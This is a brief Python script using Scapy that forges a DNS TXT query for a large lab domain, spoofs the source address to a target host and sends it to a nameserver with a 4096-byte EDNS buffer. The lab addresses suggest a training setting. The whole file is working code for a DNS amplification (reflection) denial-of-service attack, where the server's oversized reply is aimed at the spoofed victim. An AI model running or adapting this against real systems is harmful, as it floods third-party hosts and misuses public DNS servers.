

 #!/usr/bin/env python
 
from scapy.all import *
 
target     = "172.20.0.30" # Target host
nameserver = "172.20.0.20" # DNS server
domain     = "big.lab.test" 

ip  = IP(src=target, dst=nameserver)
udp = UDP(sport=RandShort(), dport=53)
dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=16), ar=DNSRROPT(rclass=4096))

request = (ip/udp/dns)
del request[UDP].chksum
del request[IP].chksum
#request = request.__class__(bytes(request)) 
send(request)
